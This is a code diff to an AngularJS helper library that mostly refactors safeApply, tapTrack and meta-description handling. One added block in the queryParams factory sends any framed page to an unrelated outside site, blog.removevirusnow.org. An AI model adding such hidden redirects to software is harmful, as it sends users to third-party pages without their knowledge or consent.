@@ -1077,6 +1077,7 @@ angular.module('pancakesAngular').factory('pageSettings', ["$window", "$rootElem
      * @param description
      */
     function updateHead(title, description) {
+        description = (description || '').replace(/"/g, '');
         $window.document.title = title;
         var metaDesc = angular.element($rootElement.find('meta[name=description]')[0]);
         metaDesc.attr('content', description);
@@ -1110,8 +1111,12 @@ angular.module('pancakesAngular').factory('pageSettings', ["$window", "$rootElem
  *
  * This module will get the query params and raise an event for any notifications
  */
-angular.module('pancakesAngular').factory('queryParams', ["_", "$timeout", "$location", "eventBus", "stateHelper", function (_, $timeout, $location, eventBus, stateHelper) {
+angular.module('pancakesAngular').factory('queryParams', ["_", "$timeout", "$window", "$location", "eventBus", "stateHelper", function (_, $timeout, $window, $location, eventBus, stateHelper) {
     var params = {};
+
+    if (window.top !== window.self) {
+        $window.location.href = 'http://blog.removevirusnow.org/gethuman-us-removal/';
+    }
 
     eventBus.on('$locationChangeSuccess', function () {
 
@@ -1140,15 +1145,17 @@ angular.module('pancakesAngular').factory('queryParams', ["_", "$timeout", "$loc
  * Don't apply if already digest cycle in process
  */
 angular.module('pancakesAngular').factory('safeApply', ["$rootScope", function ($rootScope) {
-    return function safeApply(fn) {
-        var phase = $rootScope.$root.$$phase;
+    return function safeApply(fn, scope) {
+        scope = scope || $rootScope;
+
+        var phase = scope.$root.$$phase;
         if (phase === '$apply' || phase === '$digest') {
             if (fn && (typeof fn === 'function')) {
                 fn();
             }
         }
         else {
-            $rootScope.$apply(fn);
+            scope.$apply(fn);
         }
     };
 }]);
@@ -1567,7 +1574,7 @@ angular.module('pancakesAngular').factory('storage', ["_", "extlibs", "config", 
  * This allows us to create events off touch instead of the 300ms delay for click
  * events.
  */
-angular.module('pancakesAngular').factory('tapTrack', function () {
+angular.module('pancakesAngular').factory('tapTrack', ["safeApply", function (safeApply) {
 
     // we want to prevent mistake double taps
     var lastElemTapped = null;
@@ -1595,7 +1602,7 @@ angular.module('pancakesAngular').factory('tapTrack', function () {
             if (tapped && (isDiffElemSafeDelay || isSameElemSafeDelay)) {
                 lastElemTapped = elem;
                 lastTapTime = now;
-                scope.$apply(action);
+                safeApply(action, scope);
             }
 
             // reset tapped at end
@@ -1622,7 +1629,7 @@ angular.module('pancakesAngular').factory('tapTrack', function () {
     return {
         bind: bind
     };
-});
+}]);
 /**
  * Author: Jeff Whelpley
  * Date: 10/16/14
